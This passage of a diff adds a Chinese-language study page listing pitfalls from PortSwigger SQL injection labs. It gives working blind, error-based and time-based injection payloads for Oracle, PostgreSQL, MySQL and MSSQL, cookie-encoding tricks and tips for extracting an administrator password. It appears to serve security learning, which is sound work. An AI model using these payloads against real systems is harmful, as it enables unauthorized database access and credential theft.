+<p><code>a</code> 变成裸标识符，后面的 <code>'</code> 开始了没结束的字符串 → 语法错误。</p>
+<h3 id="_27">正确做法<a class="headerlink" href="#_27" title="Permanent link">&para;</a></h3>
+<div class="language-sql highlight"><pre><span></span><code><span id="__span-24-1"><a id="__codelineno-24-1" name="__codelineno-24-1" href="#__codelineno-24-1"></a><span class="k">else</span><span class="w"> </span><span class="s1">'a'</span>
+</span></code></pre></div>
+<p><strong>字符串必须成对。</strong> 盲注里引号错一处，表现永远是同一个 500，极难定位。</p>
+<hr />
+<h2 id="10oracle-case">坑 10（Oracle 专属）：CASE 分支类型不一致<a class="headerlink" href="#10oracle-case" title="Permanent link">&para;</a></h2>
+<h3 id="_28">现象<a class="headerlink" href="#_28" title="Permanent link">&para;</a></h3>
+<div class="language-sql highlight"><pre><span></span><code><span id="__span-25-1"><a id="__codelineno-25-1" name="__codelineno-25-1" href="#__codelineno-25-1"></a><span class="p">...</span><span class="w"> </span><span class="k">then</span><span class="w"> </span><span class="mi">1</span><span class="o">/</span><span class="mi">0</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="s1">'a'</span><span class="w"> </span><span class="k">end</span><span class="w"> </span><span class="p">...</span>
+</span></code></pre></div>
+<p><strong>无论条件真假都 500。</strong></p>
+<h3 id="_29">原因<a class="headerlink" href="#_29" title="Permanent link">&para;</a></h3>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-26-1"><a id="__codelineno-26-1" name="__codelineno-26-1" href="#__codelineno-26-1"></a>then 1/0   →  NUMBER(数字)
+</span><span id="__span-26-2"><a id="__codelineno-26-2" name="__codelineno-26-2" href="#__codelineno-26-2"></a>else 'a'   →  VARCHAR2(字符串)
+</span></code></pre></div>
+<p><strong>Oracle 的 CASE 要求所有分支类型一致</strong>，否则直接 <code>ORA-00932: inconsistent datatypes</code> —— 这发生在<strong>解析阶段</strong>，不管条件真假。</p>
+<h3 id="_30">正确做法<a class="headerlink" href="#_30" title="Permanent link">&para;</a></h3>
+<div class="language-sql highlight"><pre><span></span><code><span id="__span-27-1"><a id="__codelineno-27-1" name="__codelineno-27-1" href="#__codelineno-27-1"></a><span class="k">then</span><span class="w"> </span><span class="n">TO_CHAR</span><span class="p">(</span><span class="mi">1</span><span class="o">/</span><span class="mi">0</span><span class="p">)</span><span class="w">   </span><span class="err">←</span><span class="w"> </span><span class="err">把数字转成字符串</span>
+</span><span id="__span-27-2"><a id="__codelineno-27-2" name="__codelineno-27-2" href="#__codelineno-27-2"></a><span class="k">else</span><span class="w"> </span><span class="s1">'a'</span>
+</span></code></pre></div>
+<p><strong>记忆：Oracle 里 <code>1/0</code> 要和字符串混用，必须 <code>TO_CHAR(1/0)</code>。</strong></p>
+<hr />
+<h2 id="11-500-500">坑 11：分不清「语法错误的 500」和「条件成立的 500」<a class="headerlink" href="#11-500-500" title="Permanent link">&para;</a></h2>
+<h3 id="_31">现象<a class="headerlink" href="#_31" title="Permanent link">&para;</a></h3>
+<p><strong>1=1 和 1=2 都返回同一个 <code>Internal Server Error</code> 页面。</strong></p>
+<p>我以为是条件判断，其实是 payload 语法错误 —— <strong>数据库压根没执行到判断那一步。</strong></p>
+<h3 id="_32">原因<a class="headerlink" href="#_32" title="Permanent link">&para;</a></h3>
+<p>两种情况的 HTTP 响应可以完全一样：</p>
+<table>
+<thead>
+<tr>
+<th>情况</th>
+<th>状态码</th>
+<th>页面</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>语法错误</td>
+<td>500</td>
+<td>Internal Server Error</td>
+</tr>
+<tr>
+<td>除零错误（条件成立）</td>
+<td>500</td>
+<td>Internal Server Error</td>
+</tr>
+</tbody>
+</table>
+<p><strong>光看一条请求根本区分不了。</strong></p>
+<h3 id="_33">正确做法<a class="headerlink" href="#_33" title="Permanent link">&para;</a></h3>
+<p><strong>必须做「恒真 / 恒假」对照：</strong></p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-28-1"><a id="__codelineno-28-1" name="__codelineno-28-1" href="#__codelineno-28-1"></a>① 1=1  →  必须 500
+</span><span id="__span-28-2"><a id="__codelineno-28-2" name="__codelineno-28-2" href="#__codelineno-28-2"></a>② 1=2  →  必须 200
+</span></code></pre></div>
+<table>
+<thead>
+<tr>
+<th>结果</th>
+<th>结论</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>① 500、② 200</td>
+<td>✅ 通道正常</td>
+</tr>
+<tr>
+<td><strong>① ② 都 500</strong></td>
+<td>❌ 语法/类型错误</td>
+</tr>
+<tr>
+<td>① ② 都 200</td>
+<td>❌ 报错装置没生效</td>
+</tr>
+</tbody>
+</table>
+<p><strong>这个对照是盲注的第一步，不能跳过。</strong></p>
+<hr />
+<h2 id="12lab-504">坑 12：lab 过期了，返回 504<a class="headerlink" href="#12lab-504" title="Permanent link">&para;</a></h2>
+<h3 id="_34">现象<a class="headerlink" href="#_34" title="Permanent link">&para;</a></h3>
+<div class="language-python highlight"><pre><span></span><code><span id="__span-29-1"><a id="__codelineno-29-1" name="__codelineno-29-1" href="#__codelineno-29-1"></a><span class="p">[</span><span class="err">!!</span> <span class="p">]</span> <span class="mi">1</span><span class="o">=</span><span class="mi">1</span> <span class="o">-&gt;</span> <span class="n">HTTP</span> <span class="mi">504</span> <span class="p">(</span><span class="mi">200</span> <span class="n">正常</span><span class="p">),</span><span class="n">预期500</span>
+</span><span id="__span-29-2"><a id="__codelineno-29-2" name="__codelineno-29-2" href="#__codelineno-29-2"></a><span class="p">[</span><span class="n">OK</span> <span class="p">]</span> <span class="mi">1</span><span class="o">=</span><span class="mi">2</span> <span class="o">-&gt;</span> <span class="n">HTTP</span> <span class="mi">504</span> <span class="p">(</span><span class="mi">200</span> <span class="n">正常</span><span class="p">),</span><span class="n">预期200</span>
+</span></code></pre></div>
+<p><strong>两条都是 504，但脚本按「不是 500」判成了「正常」。</strong></p>
+<h3 id="_35">原因<a class="headerlink" href="#_35" title="Permanent link">&para;</a></h3>
+<p><strong>PortSwigger 的 lab 实例闲置一段时间会被回收</strong>，CloudFront 返回 <strong>504 Gateway Timeout</strong>。</p>
+<p><strong>504 的请求根本没到应用，更没到数据库。</strong></p>
+<h3 id="_36">正确做法<a class="headerlink" href="#_36" title="Permanent link">&para;</a></h3>
+<p><strong>先分清是网络问题还是实例过期：</strong></p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-30-1"><a id="__codelineno-30-1" name="__codelineno-30-1" href="#__codelineno-30-1"></a>portswigger.net         →  200   →  网络正常
+</span><span id="__span-30-2"><a id="__codelineno-30-2" name="__codelineno-30-2" href="#__codelineno-30-2"></a>&lt;lab域名&gt;               →  504   →  实例已过期
+</span></code></pre></div>
+<p><strong>处理：</strong></p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-31-1"><a id="__codelineno-31-1" name="__codelineno-31-1" href="#__codelineno-31-1"></a>① 回 lab 页面点 Restart lab
+</span><span id="__span-31-2"><a id="__codelineno-31-2" name="__codelineno-31-2" href="#__codelineno-31-2"></a>② 拿到新 URL(域名会变)
+</span><span id="__span-31-3"><a id="__codelineno-31-3" name="__codelineno-31-3" href="#__codelineno-31-3"></a>③ 重新抓 TrackingId
+</span><span id="__span-31-4"><a id="__codelineno-31-4" name="__codelineno-31-4" href="#__codelineno-31-4"></a>④ ⚠️ 密码也会变,长度要重新测
+</span><span id="__span-31-5"><a id="__codelineno-31-5" name="__codelineno-31-5" href="#__codelineno-31-5"></a>⑤ 更新脚本的 BASE_URL / TRACKING / PASSWORD_LEN
+</span></code></pre></div>
+<p><strong>脚本层面：遇到非 200/500 的状态码要直接报错，不能当成「条件为假」。</strong></p>
+<hr />
+<h2 id="13substring-substr">坑 13：<code>SUBSTRING</code> 和 <code>SUBSTR</code> 混用<a class="headerlink" href="#13substring-substr" title="Permanent link">&para;</a></h2>
+<h3 id="_37">现象<a class="headerlink" href="#_37" title="Permanent link">&para;</a></h3>
+<p>在 Oracle 上用 <code>SUBSTRING(...)</code> → 500。</p>
+<h3 id="_38">原因<a class="headerlink" href="#_38" title="Permanent link">&para;</a></h3>
+<table>
+<thead>
+<tr>
+<th>数据库</th>
+<th>取子串函数</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Oracle</td>
+<td><strong><code>SUBSTR</code></strong></td>
+</tr>
+<tr>
+<td>PostgreSQL / MySQL</td>
+<td><code>SUBSTRING</code>（<code>SUBSTR</code> 也支持）</td>
+</tr>
+<tr>
+<td>SQL Server</td>
+<td><code>SUBSTRING</code></td>
+</tr>
+</tbody>
+</table>
+<p><strong>Oracle 没有 <code>SUBSTRING</code></strong> → <code>ORA-00904</code>。</p>
+<h3 id="_39">正确做法<a class="headerlink" href="#_39" title="Permanent link">&para;</a></h3>
+<p><strong>先确定数据库类型再写函数。</strong> 判断方法见 <code>01-原理与识别.md</code>。</p>
+<hr />
+<h2 id="14cookie">坑 14：Cookie 里的分隔符和空格<a class="headerlink" href="#14cookie" title="Permanent link">&para;</a></h2>
+<h3 id="_40">现象<a class="headerlink" href="#_40" title="Permanent link">&para;</a></h3>
+<p>Cookie 头写成：</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-32-1"><a id="__codelineno-32-1" name="__codelineno-32-1" href="#__codelineno-32-1"></a>TrackingId=xxx'...='a'--session=GtbUq...
+</span></code></pre></div>
+<p><strong>分号丢了，<code>session</code> 被并进 TrackingId 值里。</strong></p>
+<h3 id="_41">原因<a class="headerlink" href="#_41" title="Permanent link">&para;</a></h3>
+<p>Cookie 之间必须用 <code>;</code> 分隔。少了分号，整个变成一个值。</p>
+<h3 id="_42">正确做法<a class="headerlink" href="#_42" title="Permanent link">&para;</a></h3>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-33-1"><a id="__codelineno-33-1" name="__codelineno-33-1" href="#__codelineno-33-1"></a>Cookie: TrackingId=xxx'...='a'--; session=GtbUq...
+</span><span id="__span-33-2"><a id="__codelineno-33-2" name="__codelineno-33-2" href="#__codelineno-33-2"></a>                                ↑
+</span><span id="__span-33-3"><a id="__codelineno-33-3" name="__codelineno-33-3" href="#__codelineno-33-3"></a>                          分号 + 空格
+</span></code></pre></div>
+<p><strong>另外：Cookie 值里理论上不允许空格。</strong> 若遇到莫名失败，把空格换成 <code>%20</code>。</p>
+<hr />
+<h2 id="15">坑 15：盲注逐字符手工试，慢到不可用<a class="headerlink" href="#15" title="Permanent link">&para;</a></h2>
+<h3 id="_43">现象<a class="headerlink" href="#_43" title="Permanent link">&para;</a></h3>
+<p>20 位密码 × 36 个字符 = 720 次手工测试，根本跑不完。</p>
+<h3 id="_44">原因<a class="headerlink" href="#_44" title="Permanent link">&para;</a></h3>
+<ul>
+<li>手工效率极低</li>
+<li><strong>Burp 社区版 Intruder 有限速</strong>，反而更慢</li>
+</ul>
+<h3 id="_45">正确做法<a class="headerlink" href="#_45" title="Permanent link">&para;</a></h3>
+<p><strong>① 二分查找：</strong> 每位 7 次，20 位共 140 次
+<strong>② 多线程并发：</strong> 20 个位置同时跑</p>
+<p><strong>脚本见 本目录下的 <code>blind_sqli_error.py</code>（条件错误型）、<code>blind_sqli.py</code>（条件响应型）。</strong></p>
+<hr />
+<h2 id="16-mssql-if-postgresql">坑 16：把 MSSQL 的 <code>IF</code> 用在 PostgreSQL 上<a class="headerlink" href="#16-mssql-if-postgresql" title="Permanent link">&para;</a></h2>
+<h3 id="_46">现象<a class="headerlink" href="#_46" title="Permanent link">&para;</a></h3>
+<div class="language-sql highlight"><pre><span></span><code><span id="__span-34-1"><a id="__codelineno-34-1" name="__codelineno-34-1" href="#__codelineno-34-1"></a><span class="n">x</span><span class="err">'</span><span class="p">;</span><span class="k">if</span><span class="p">(</span><span class="mi">1</span><span class="o">=</span><span class="mi">1</span><span class="p">)</span><span class="n">pg_sleep</span><span class="p">(</span><span class="mi">5</span><span class="p">)</span><span class="k">else</span><span class="w"> </span><span class="n">pg_sleep</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="c1">--</span>
+</span></code></pre></div>
+<p><strong>页面没延迟,也没报错(应用吞掉了错误)。</strong></p>
+<h3 id="_47">原因<a class="headerlink" href="#_47" title="Permanent link">&para;</a></h3>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-35-1"><a id="__codelineno-35-1" name="__codelineno-35-1" href="#__codelineno-35-1"></a>IF ... ELSE ...     ← MSSQL 的语句
+</span><span id="__span-35-2"><a id="__codelineno-35-2" name="__codelineno-35-2" href="#__codelineno-35-2"></a>pg_sleep()          ← PostgreSQL 的函数
+</span></code></pre></div>
+<p><strong>两个拼一起,两边都不认:</strong></p>
+<ul>
+<li>PostgreSQL 没有 <code>IF</code> 关键字 → <code>if(1=1)</code> 被当成函数调用 → <code>function if(boolean) does not exist</code></li>
+<li>MSSQL 没有 <code>pg_sleep</code></li>
+</ul>
+<p><strong>语法错误 → 语句没执行 → 没有延迟。</strong></p>
+<h3 id="_48">正确做法<a class="headerlink" href="#_48" title="Permanent link">&para;</a></h3>
+<p><strong>PostgreSQL 只能用 <code>CASE</code> 表达式:</strong></p>
+<div class="language-sql highlight"><pre><span></span><code><span id="__span-36-1"><a id="__codelineno-36-1" name="__codelineno-36-1" href="#__codelineno-36-1"></a><span class="n">x</span><span class="err">'</span><span class="p">;</span><span class="k">select</span><span class="w"> </span><span class="k">case</span><span class="w"> </span><span class="k">when</span><span class="w"> </span><span class="p">(</span><span class="mi">1</span><span class="o">=</span><span class="mi">1</span><span class="p">)</span><span class="w"> </span><span class="k">then</span><span class="w"> </span><span class="n">pg_sleep</span><span class="p">(</span><span class="mi">5</span><span class="p">)</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="n">pg_sleep</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="w"> </span><span class="k">end</span><span class="c1">--</span>
+</span></code></pre></div>
+<p><strong>四库对照:</strong></p>
+<table>
+<thead>
+<tr>
+<th>数据库</th>
+<th>条件延迟</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>MSSQL</td>
+<td><code>';if (1=1) waitfor delay '0:0:5'--</code></td>
+</tr>
+<tr>
+<td>PostgreSQL</td>
+<td><code>';select case when (1=1) then pg_sleep(5) else pg_sleep(0) end--</code></td>
+</tr>
+<tr>
+<td>MySQL</td>
+<td><code>';select case when (1=1) then sleep(5) else sleep(0) end--</code></td>
+</tr>
+<tr>
+<td>Oracle</td>
+<td><code>' and case when (1=1) then dbms_pipe.receive_message(('a'),5) else 0 end=1--</code></td>
+</tr>
+</tbody>
+</table>
+<hr />
+<h2 id="17else-pg_sleep0-else-0">坑 17：<code>ELSE pg_sleep(0)</code> 写成了 <code>ELSE 0</code><a class="headerlink" href="#17else-pg_sleep0-else-0" title="Permanent link">&para;</a></h2>
+<h3 id="_49">现象<a class="headerlink" href="#_49" title="Permanent link">&para;</a></h3>
+<div class="language-sql highlight"><pre><span></span><code><span id="__span-37-1"><a id="__codelineno-37-1" name="__codelineno-37-1" href="#__codelineno-37-1"></a><span class="k">case</span><span class="w"> </span><span class="k">when</span><span class="w"> </span><span class="p">(</span><span class="mi">1</span><span class="o">=</span><span class="mi">1</span><span class="p">)</span><span class="w"> </span><span class="k">then</span><span class="w"> </span><span class="n">pg_sleep</span><span class="p">(</span><span class="mi">5</span><span class="p">)</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="mi">0</span><span class="w"> </span><span class="k">end</span>
+</span></code></pre></div>
+<p><strong>报错,或行为异常。</strong></p>
+<h3 id="_50">原因<a class="headerlink" href="#_50" title="Permanent link">&para;</a></h3>
+<p><strong>CASE 要求所有分支类型一致:</strong></p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-38-1"><a id="__codelineno-38-1" name="__codelineno-38-1" href="#__codelineno-38-1"></a>THEN pg_sleep(5)  →  void(空)
+</span><span id="__span-38-2"><a id="__codelineno-38-2" name="__codelineno-38-2" href="#__codelineno-38-2"></a>ELSE 0            →  integer(整数)
+</span><span id="__span-38-3"><a id="__codelineno-38-3" name="__codelineno-38-3" href="#__codelineno-38-3"></a>                    ↑ 类型不一致
+</span></code></pre></div>
+<p><strong>PostgreSQL 报:</strong> <code>CASE types integer and void cannot be matched</code></p>
+<h3 id="_51">正确做法<a class="headerlink" href="#_51" title="Permanent link">&para;</a></h3>
+<p><strong>两边都必须是 <code>pg_sleep</code>:</strong></p>
+<div class="language-sql highlight"><pre><span></span><code><span id="__span-39-1"><a id="__codelineno-39-1" name="__codelineno-39-1" href="#__codelineno-39-1"></a><span class="k">case</span><span class="w"> </span><span class="k">when</span><span class="w"> </span><span class="p">(</span><span class="mi">1</span><span class="o">=</span><span class="mi">1</span><span class="p">)</span><span class="w"> </span><span class="k">then</span><span class="w"> </span><span class="n">pg_sleep</span><span class="p">(</span><span class="mi">5</span><span class="p">)</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="n">pg_sleep</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="w"> </span><span class="k">end</span>
+</span></code></pre></div>
+<p><strong>这和 Oracle 里 <code>THEN TO_CHAR(1/0) ELSE 'a' END</code> 是同一类问题 —— 分支类型必须统一。</strong></p>
+<hr />
+<h2 id="18cookie">坑 18：Cookie 里的 <code>;</code> 没编码<a class="headerlink" href="#18cookie" title="Permanent link">&para;</a></h2>
+<h3 id="_52">现象<a class="headerlink" href="#_52" title="Permanent link">&para;</a></h3>
+<div class="language-sql highlight"><pre><span></span><code><span id="__span-40-1"><a id="__codelineno-40-1" name="__codelineno-40-1" href="#__codelineno-40-1"></a><span class="n">TrackingId</span><span class="o">=</span><span class="n">x</span><span class="err">'</span><span class="p">;</span><span class="k">select</span><span class="w"> </span><span class="k">case</span><span class="w"> </span><span class="k">when</span><span class="w"> </span><span class="p">...</span>
+</span><span id="__span-40-2"><a id="__codelineno-40-2" name="__codelineno-40-2" href="#__codelineno-40-2"></a><span class="w">              </span><span class="err">↑</span>
+</span><span id="__span-40-3"><a id="__codelineno-40-3" name="__codelineno-40-3" href="#__codelineno-40-3"></a><span class="w">        </span><span class="err">这个分号被</span><span class="w"> </span><span class="n">HTTP</span><span class="w"> </span><span class="err">当成了</span><span class="w"> </span><span class="n">cookie</span><span class="w"> </span><span class="err">分隔符</span>
+</span></code></pre></div>
+<p><strong>服务器实际收到:<code>TrackingId=x'</code>,后面的全成了另一个 cookie。</strong></p>
+<p><strong>结果:注入根本没进 SQL,但页面正常(200),看起来"什么都没发生"。</strong></p>
+<h3 id="_53">原因<a class="headerlink" href="#_53" title="Permanent link">&para;</a></h3>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-41-1"><a id="__codelineno-41-1" name="__codelineno-41-1" href="#__codelineno-41-1"></a>Cookie: a=1; b=2
+</span><span id="__span-41-2"><a id="__codelineno-41-2" name="__codelineno-41-2" href="#__codelineno-41-2"></a>        └─┬─┘ └─┬─┘
+</span><span id="__span-41-3"><a id="__codelineno-41-3" name="__codelineno-41-3" href="#__codelineno-41-3"></a>        两个 cookie
+</span></code></pre></div>
+<p><strong><code>;</code> 是 HTTP 层的分隔符,不是 SQL 的。</strong></p>
+<h3 id="_54">正确做法<a class="headerlink" href="#_54" title="Permanent link">&para;</a></h3>
+<p><strong>编码成 <code>%3B</code>:</strong></p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-42-1"><a id="__codelineno-42-1" name="__codelineno-42-1" href="#__codelineno-42-1"></a>TrackingId=x'%3Bselect+case+when+...
+</span></code></pre></div>
+<p><strong>同理,空格编码成 <code>+</code>(或 <code>%20</code>)。</strong></p>
+<hr />
+<h2 id="19">坑 19：时间盲注用绝对阈值<a class="headerlink" href="#19" title="Permanent link">&para;</a></h2>
+<h3 id="_55">现象<a class="headerlink" href="#_55" title="Permanent link">&para;</a></h3>
+<div class="language-python highlight"><pre><span></span><code><span id="__span-43-1"><a id="__codelineno-43-1" name="__codelineno-43-1" href="#__codelineno-43-1"></a><span class="k">if</span> <span class="n">elapsed</span> <span class="o">&gt;</span> <span class="mf">3.5</span><span class="p">:</span>   <span class="c1"># 假定延迟 5 秒</span>
+</span><span id="__span-43-2"><a id="__codelineno-43-2" name="__codelineno-43-2" href="#__codelineno-43-2"></a>    <span class="k">return</span> <span class="kc">True</span>
+</span></code></pre></div>
+<p><strong>有时"假"的请求也判成真,密码解错。</strong></p>
+<h3 id="_56">原因<a class="headerlink" href="#_56" title="Permanent link">&para;</a></h3>
+<p><strong>你的网络到靶场本来就有 1 秒延迟。</strong> 加上抖动,假请求可能到 2~3 秒,逼近阈值。</p>
+<h3 id="_57">正确做法<a class="headerlink" href="#_57" title="Permanent link">&para;</a></h3>
+<p><strong>先测基准,阈值用相对值:</strong></p>
+<div class="language-python highlight"><pre><span></span><code><span id="__span-44-1"><a id="__codelineno-44-1" name="__codelineno-44-1" href="#__codelineno-44-1"></a><span class="n">base</span> <span class="o">=</span> <span class="n">基准延迟</span><span class="p">(</span><span class="mi">3</span> <span class="n">次取中位数</span><span class="p">)</span>
+</span><span id="__span-44-2"><a id="__codelineno-44-2" name="__codelineno-44-2" href="#__codelineno-44-2"></a><span class="n">threshold</span> <span class="o">=</span> <span class="n">base</span> <span class="o">+</span> <span class="n">DELAY</span> <span class="o">*</span> <span class="mf">0.55</span>     <span class="c1"># 5 秒延迟 → base + 2.75</span>
+</span></code></pre></div>
+<p><strong>两侧各留 1 秒以上余量,抖动才不会误判。</strong></p>
+<hr />
+<h2 id="20">坑 20：字符集不含大写字母,静默出错<a class="headerlink" href="#20" title="Permanent link">&para;</a></h2>
+<h3 id="_58">现象<a class="headerlink" href="#_58" title="Permanent link">&para;</a></h3>
+<p><strong>密码里有 <code>A</code>,脚本却输出 <code>a</code>;验证失败,但不知道哪一位错。</strong></p>
+<h3 id="_59">原因<a class="headerlink" href="#_59" title="Permanent link">&para;</a></h3>
+<p><strong>二分查找只在给定字符集里找"最接近的那个":</strong></p>
+<div class="language-python highlight"><pre><span></span><code><span id="__span-45-1"><a id="__codelineno-45-1" name="__codelineno-45-1" href="#__codelineno-45-1"></a><span class="n">CHARSET</span> <span class="o">=</span> <span class="s2">"0123456789abcdefghijklmnopqrstuvwxyz"</span>
+</span></code></pre></div>
+<table>
+<thead>
+<tr>
+<th>真实字符</th>
+<th>ASCII</th>
+<th>会被判成</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>A</code>–<code>Z</code>(65–90)</td>
+<td>在 <code>'9'</code> 和 <code>'a'</code> 之间</td>
+<td><strong><code>a</code></strong></td>
+</tr>
+<tr>
+<td>空格 / <code>!</code> / <code>"</code>(32–47)</td>
+<td>比 <code>'0'</code> 小</td>
+<td><strong><code>0</code></strong></td>
+</tr>
+<tr>
+<td><code>{</code> <code>\|</code> <code>}</code>(123–126)</td>
+<td>比 <code>'z'</code> 大</td>
+<td><strong><code>z</code></strong></td>
+</tr>
+</tbody>
+</table>
+<p><strong>不会报错,只会悄悄给错答案。</strong></p>
+<h3 id="_60">正确做法<a class="headerlink" href="#_60" title="Permanent link">&para;</a></h3>
+<div class="language-python highlight"><pre><span></span><code><span id="__span-46-1"><a id="__codelineno-46-1" name="__codelineno-46-1" href="#__codelineno-46-1"></a><span class="c1"># 不确定字符集时,用全部可打印 ASCII</span>
+</span><span id="__span-46-2"><a id="__codelineno-46-2" name="__codelineno-46-2" href="#__codelineno-46-2"></a><span class="n">CHARSET</span> <span class="o">=</span> <span class="s2">""</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="nb">chr</span><span class="p">(</span><span class="n">c</span><span class="p">)</span> <span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">32</span><span class="p">,</span> <span class="mi">127</span><span class="p">))</span>
+</span></code></pre></div>
+<p><strong>代价:每位多 1 次请求(6 → 7)。</strong></p>
+<hr />
+<h2 id="21">坑 21：时间盲注开了并发<a class="headerlink" href="#21" title="Permanent link">&para;</a></h2>
+<h3 id="_61">现象<a class="headerlink" href="#_61" title="Permanent link">&para;</a></h3>
+<p><strong>结果乱跳,同一道题重跑两次得到不同密码。</strong></p>
+<h3 id="_62">原因<a class="headerlink" href="#_62" title="Permanent link">&para;</a></h3>
+<p><strong>并发请求会互相抢占带宽和服务器资源 → 响应时间全部偏移 → 计时判断失效。</strong></p>
+<h3 id="_63">正确做法<a class="headerlink" href="#_63" title="Permanent link">&para;</a></h3>
+<p><strong>时间盲注只能串行。</strong></p>
+<p><strong>想提速,靠这两条:</strong></p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-47-1"><a id="__codelineno-47-1" name="__codelineno-47-1" href="#__codelineno-47-1"></a>① 缩小字符集(36 个 → 6 次/位)
+</span><span id="__span-47-2"><a id="__codelineno-47-2" name="__codelineno-47-2" href="#__codelineno-47-2"></a>② 降低延迟(5 秒 → 2 秒,配合基准校准)
+</span></code></pre></div>
+<hr />
+<h2 id="22">坑 22：跑完不验证,不知道错在哪<a class="headerlink" href="#22" title="Permanent link">&para;</a></h2>
+<h3 id="_64">现象<a class="headerlink" href="#_64" title="Permanent link">&para;</a></h3>
+<p><strong>脚本输出一串字符,提交后提示密码错误,然后无从下手。</strong></p>
+<h3 id="_65">正确做法<a class="headerlink" href="#_65" title="Permanent link">&para;</a></h3>
+<p><strong>跑完发一条"整串比对"的请求:</strong></p>
+<div class="language-sql highlight"><pre><span></span><code><span id="__span-48-1"><a id="__codelineno-48-1" name="__codelineno-48-1" href="#__codelineno-48-1"></a><span class="n">x</span><span class="s1">'%3Bselect+case+when+(username='</span><span class="n">administrator</span><span class="s1">'and+password='</span><span class="err">提取出的密码'</span><span class="p">)</span>
+</span><span id="__span-48-2"><a id="__codelineno-48-2" name="__codelineno-48-2" href="#__codelineno-48-2"></a><span class="w">   </span><span class="o">+</span><span class="k">then</span><span class="o">+</span><span class="n">pg_sleep</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span><span class="o">+</span><span class="k">else</span><span class="o">+</span><span class="n">pg_sleep</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">+</span><span class="k">end</span><span class="o">+</span><span class="k">from</span><span class="o">+</span><span class="n">users</span><span class="c1">--</span>
+</span></code></pre></div>
+<ul>
+<li><strong>延迟 = 密码完全正确</strong></li>
+<li><strong>不延迟 = 肯定有错</strong></li>
+</ul>
+<p><strong>这只是 1 次请求,但能省掉无数猜测。</strong></p>
+<hr />
+<h2 id="23-and-cast">坑 23：可见错误里 <code>AND</code> 直接接 <code>CAST</code><a class="headerlink" href="#23-and-cast" title="Permanent link">&para;</a></h2>
+<h3 id="_66">现象<a class="headerlink" href="#_66" title="Permanent link">&para;</a></h3>
+<div class="language-sql highlight"><pre><span></span><code><span id="__span-49-1"><a id="__codelineno-49-1" name="__codelineno-49-1" href="#__codelineno-49-1"></a><span class="err">'</span><span class="w"> </span><span class="k">AND</span><span class="w"> </span><span class="k">CAST</span><span class="p">((</span><span class="k">SELECT</span><span class="w"> </span><span class="n">password</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">users</span><span class="w"> </span><span class="k">LIMIT</span><span class="w"> </span><span class="mi">1</span><span class="p">)</span><span class="w"> </span><span class="k">AS</span><span class="w"> </span><span class="nb">int</span><span class="p">)</span><span class="c1">--</span>
+</span></code></pre></div>
+<p><strong>报错 <code>argument of AND must be type boolean, not type integer</code>。</strong></p>
+<h3 id="_67">原因<a class="headerlink" href="#_67" title="Permanent link">&para;</a></h3>
+<p><strong><code>AND</code> 两边都必须是布尔值,而 <code>CAST(...)</code> 返回整数。</strong></p>
+<h3 id="_68">正确做法<a class="headerlink" href="#_68" title="Permanent link">&para;</a></h3>
+<p><strong>加一个比较,变成布尔:</strong></p>
+<div class="language-sql highlight"><pre><span></span><code><span id="__span-50-1"><a id="__codelineno-50-1" name="__codelineno-50-1" href="#__codelineno-50-1"></a><span class="err">'</span><span class="w"> </span><span class="k">AND</span><span class="w"> </span><span class="mi">1</span><span class="o">=</span><span class="k">CAST</span><span class="p">((</span><span class="k">SELECT</span><span class="w"> </span><span class="n">password</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">users</span><span class="w"> </span><span class="k">LIMIT</span><span class="w"> </span><span class="mi">1</span><span class="p">)</span><span class="w"> </span><span class="k">AS</span><span class="w"> </span><span class="nb">int</span><span class="p">)</span><span class="c1">--</span>
+</span></code></pre></div>
+<hr />
+<h2 id="24payload">坑 24：payload 被截断,却以为是语法错<a class="headerlink" href="#24payload" title="Permanent link">&para;</a></h2>
+<h3 id="_69">现象<a class="headerlink" href="#_69" title="Permanent link">&para;</a></h3>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-51-1"><a id="__codelineno-51-1" name="__codelineno-51-1" href="#__codelineno-51-1"></a>Unterminated string literal started at position 97
+</span></code></pre></div>
+<p><strong>位置 97 落在 <code>'administrator'</code> 中间。</strong></p>
+<h3 id="_70">原因<a class="headerlink" href="#_70" title="Permanent link">&para;</a></h3>
+<p><strong>cookie 值有长度上限。</strong> 你写的 payload 太长,后半截(<code>)as int)=1--</code>)被剪掉:</p>
+<div class="language-sql highlight"><pre><span></span><code><span id="__span-52-1"><a id="__codelineno-52-1" name="__codelineno-52-1" href="#__codelineno-52-1"></a><span class="p">...</span><span class="k">where</span><span class="w"> </span><span class="n">username</span><span class="o">=</span><span class="err">'</span><span class="n">administr</span><span class="w">        </span><span class="err">←</span><span class="w"> </span><span class="err">字符串没闭合</span>
+</span></code></pre></div>
+<p><strong>不是引号配对错,是字符不够用。</strong></p>
+<h3 id="_71">正确做法<a class="headerlink" href="#_71" title="Permanent link">&para;</a></h3>
+<p><strong>缩短 payload:</strong></p>
+<table>
+<thead>
+<tr>
+<th>长写法</th>
+<th>短写法</th>
+</tr>
